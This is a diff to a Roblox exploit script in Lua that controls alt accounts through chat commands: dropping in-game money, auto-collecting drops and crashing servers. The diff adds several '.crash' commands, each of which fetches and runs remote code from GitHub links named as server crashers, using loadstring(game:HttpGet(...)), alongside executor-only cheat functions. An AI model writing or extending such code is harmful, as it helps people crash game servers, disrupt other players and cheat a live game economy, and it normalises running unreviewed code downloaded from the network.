@@ -1,6 +1,4 @@
-getgenv().HostUser = "NihadGoku"
-getgenv().Alts = {137474079}
-local Testing = true
+local Testing = false
 -- Cmds
 if table.find(getgenv().Alts,game.Players.LocalPlayer.UserId) then
 	getgenv().PointInTable = table.find(getgenv().Alts,game.Players.LocalPlayer.UserId)
@@ -8,7 +6,7 @@ else
 	return
 end
 if game.Players.LocalPlayer.Name == getgenv().HostUser or getgenv().Executed then
---	return
+	return
 end
 UserSettings().GameSettings.MasterVolume = 0
 local Crashed = false
@@ -389,6 +387,8 @@ local function GetNumberFromText(str)
 	end
 	return tonumber(str)
 end
+local DropFolder = workspace.Ignored:FindFirstChild("Drop")
+
 local function Initiate()
 	CurrAnim = nil
 	for Index,Var in pairs(CmdSettings) do
@@ -400,20 +400,17 @@ local function Initiate()
 		Connection:Disconnect()
 	end
 	Connections["OnChat"] = Host.Chatted:Connect(function(Message)
-	    Message = string.lower(Message)
+		Message = string.lower(Message)
 		local Args = string.split(Message," ")
 		local AmountOfArgs = #Args
 		if Host and not Crashed and Variables["Player"].Character and Variables["Player"].Character:FindFirstChild("HumanoidRootPart") and Variables["Player"].Character:FindFirstChild("Humanoid") and Variables["Player"].Character.Humanoid.Health > 0 then
 			if Args[1] == ".drop" then
 				Drop(true)
 			elseif Message == ".loopdel" then
-				local DropFolder = workspace.Ignored.Drop
-				for Index,child in pairs(DropFolder:GetChildren()) do
-					game.Debris:AddItem(child,0.1)
+				if DropFolder then
+					DropFolder:Destroy()
+					DropFolder = nil
 				end
-				DropFolder.ChildAdded:Connect(function(Child)
-					game.Debris:AddItem(child,0.1)
-				end)
 			elseif Message == ".circle host" and Host and Host.Character and Host.Character:FindFirstChild("Humanoid") and Host.Character.Humanoid.Health > 0 then
 				local angle = 0
 				local cfr = Host.Character.HumanoidRootPart.CFrame*CFrame.new(0,1,0)
@@ -442,7 +439,7 @@ local function Initiate()
 				Clone.HumanoidRootPart.CFrame = cfr * CFrame.fromEulerAnglesXYZ(0,math.rad(angle),0) * CFrame.new(0,-size,-10)
 				Clone.HumanoidRootPart.CFrame=Clone.HumanoidRootPart.CFrame*CFrame.new(0,0,2)
 				Clone.HumanoidRootPart.CFrame=Clone.HumanoidRootPart.CFrame*CFrame.Angles(0,math.rad(180),0)
- 			elseif Args[1] == ".load" and Args[2] == "swag"then
+ 			elseif Args[1] == ".crash" and Args[2] == "swag" and not Crashed then
 				local Player = GetPlayerFromString(Args[3],true)
 				if Player and Player == game.Players.LocalPlayer then
 					if game.CoreGui:FindFirstChild("RenderScreen") then
@@ -451,6 +448,60 @@ local function Initiate()
 					game:GetService("RunService"):Set3dRenderingEnabled(true)
 					Crashed = true
 					loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
+					coroutine.wrap(function()
+						setfpscap(60)
+						wait(1)
+						setfpscap(60)
+						wait(1)
+						setfpscap(60)
+						wait(1)
+						setfpscap(60)	
+					end)()
+					for Index,Var in pairs(CmdSettings) do
+						CmdSettings[Var] = nil
+					end
+					CmdSettings = {}
+					for Index,Connection in pairs(Connections) do
+						Index[Connection] = nil
+						Connection:Disconnect()
+					end
+				end
+			elseif Args[1] == ".crash" and Args[2] == "encrypt" and not Crashed then
+				local Player = GetPlayerFromString(Args[3],true)
+				if Player and Player == game.Players.LocalPlayer then
+					if game.CoreGui:FindFirstChild("RenderScreen") then
+						game.CoreGui.RenderScreen:Destroy()
+					end
+					game:GetService("RunService"):Set3dRenderingEnabled(true)
+					Crashed = true
+					loadstring(game:HttpGet("https://raw.githubusercontent.com/remorseW/encryptW/main/CustomEncryptCrasher.lua"))()
+					coroutine.wrap(function()
+						setfpscap(60)
+						wait(1)
+						setfpscap(60)
+						wait(1)
+						setfpscap(60)
+						wait(1)
+						setfpscap(60)	
+					end)()
+					for Index,Var in pairs(CmdSettings) do
+						CmdSettings[Var] = nil
+					end
+					CmdSettings = {}
+					for Index,Connection in pairs(Connections) do
+						Index[Connection] = nil
+						Connection:Disconnect()
+					end
+				end
+			elseif Args[1] == ".crash" and Args[2] == "15min" and not Crashed then
+				local Player = GetPlayerFromString(Args[3],true)
+				if Player and Player == game.Players.LocalPlayer then
+					if game.CoreGui:FindFirstChild("RenderScreen") then
+						game.CoreGui.RenderScreen:Destroy()
+					end
+					game:GetService("RunService"):Set3dRenderingEnabled(true)
+					Crashed = true
+					loadstring(game:HttpGet("https://raw.githubusercontent.com/remorseW/encryptW/main/DahooSuperQuickCrash.lua"))()
 					coroutine.wrap(function()
 						setfpscap(60)
 						wait(1)
@@ -596,18 +647,19 @@ local function Initiate()
 						CmdSettings["Aura"] = true
 						CmdSettings["Dropping"] = nil
 						CmdSettings["CustomDrop"] = nil
-						local DropFolder = workspace.Ignored.Drop
-
-						while CmdSettings["Aura"] == true do
-							for i,v in pairs(DropFolder:GetChildren()) do
-								if v:IsA("BasePart") and v.Name == "MoneyDrop" then
-									if (v.Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= 12 then
-										if CmdSettings["Aura"] == true then
-											fireclickdetector(v.ClickDetector)
+				
+						while CmdSettings["Aura"] == true and DropFolder do
+							if DropFolder then
+								for i,v in pairs(DropFolder:GetChildren()) do
+									if v:IsA("BasePart") and v.Name == "MoneyDrop" then
+										if (v.Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= 12 then
+											if CmdSettings["Aura"] == true then
+												fireclickdetector(v.ClickDetector)
+											end
+											wait(0.2)
 										end
-										wait(0.2)
 									end
-								end
+								end								
 							end
 							wait()
 						end
@@ -617,12 +669,12 @@ local function Initiate()
 				CmdSettings["Aura"] = nil
 			elseif Args[1] == ".cdrop" and Args[2] ~= nil and not CmdSettings["CustomDrop"] then
 				local Number = GetNumberFromText(Args[2]) 
-				if Number then
+				if Number and DropFolder then
 					CmdSettings["Aura"] = nil
 					CmdSettings["Dropping"] = false
-					local Drop = workspace.Ignored.Drop
+					
 					local OldMoney = 0
-					for i,v in pairs(Drop:GetChildren()) do
+					for i,v in pairs(DropFolder:GetChildren()) do
 						if v.Name == "MoneyDrop" then
 							local numbers = string.gsub(v.BillboardGui.TextLabel.Text, "%D", "")
 							OldMoney += numbers
@@ -639,15 +691,19 @@ local function Initiate()
 								"DropMoney",
 								10000
 							)
-							local Drop = workspace.Ignored.Drop
+						
 							local Money = 0
-							for i,v in pairs(Drop:GetChildren()) do
-								if v.Name == "MoneyDrop" then
-									local numbers = string.gsub(v.BillboardGui.TextLabel.Text, "%D", "")
-									Money += numbers
-								end
-							end 
-						until Money >= (OldMoney+Number) or not CmdSettings["CustomDrop"]
+							if DropFolder then
+								for i,v in pairs(DropFolder:GetChildren()) do
+									if v.Name == "MoneyDrop" then
+										local numbers = string.gsub(v.BillboardGui.TextLabel.Text, "%D", "")
+										Money += numbers
+									end
+								end 
+							end
+						
+						until not DropFolder or Money >= (OldMoney+Number) or not CmdSettings["CustomDrop"]
+						game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('Custom Drop has been stopped or finished.', 'All'); 
 					end)()
 				end
 			end
